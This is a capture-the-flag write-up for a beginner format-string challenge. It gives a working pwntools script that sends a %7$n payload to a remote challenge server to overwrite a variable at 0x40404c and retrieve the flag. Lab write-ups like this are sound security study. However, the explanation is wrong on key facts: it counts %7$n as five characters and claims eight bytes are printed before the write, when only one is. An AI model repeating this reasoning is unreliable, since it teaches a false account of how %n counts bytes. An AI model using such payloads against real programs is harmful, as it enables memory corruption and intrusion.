---
title: "Formatted — Format String Write with %n"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "format-string", "pwntools"]
difficulty: "beginner"
summary: "Use a format string %n write to overwrite a target variable at a known address and unlock the flag path."
---

## The Challenge

The binary prints back user input through `printf` without a format string, and somewhere in memory there is a variable whose value controls access to the flag. Writing a specific small integer to that address through `%n` triggers the win condition.

## Approach

`%n` writes the number of bytes printed so far into a pointer argument on the stack. The goal is to control that count to write a specific value to a specific address.

The target address is `0x40404c`. The payload crafts 8 printable bytes before the address (making the byte count at `%7$n` equal to 8, which lands a small integer at offset 7 on the stack), then appends the little-endian-packed target address as the argument `%7$n` will dereference and write into.

The write value `8` lines up perfectly with whatever check the binary performs — it just needs to be non-zero (or equal to a specific small constant).

## Solution

```python
from pwn import *

addr = p64(0x40404c)
payload = b" %7$n   " + addr
r = remote("formatted.challs.olicyber.it", 10305)
r.recv(100)
r.sendline(payload)
r.recvuntil(b"flag{")
print("flag{" + r.recvuntil(b"}").decode())
```

`" %7$n   "` is exactly 8 bytes: a space, then `%7$n` (5 chars), then three spaces. When `printf` processes this, by the time it hits the `%7$n` conversion it has printed 8 characters, so it writes `8` to the address pointed to by the 7th argument on the stack — which we placed there as `addr`.

## What I Learned

`%n` writes a byte count, not an arbitrary value. Controlling the byte count before the conversion lets you write small integers to arbitrary addresses without spraying the format string with padding. Counting format string argument positions (the `$` notation) is the key skill.
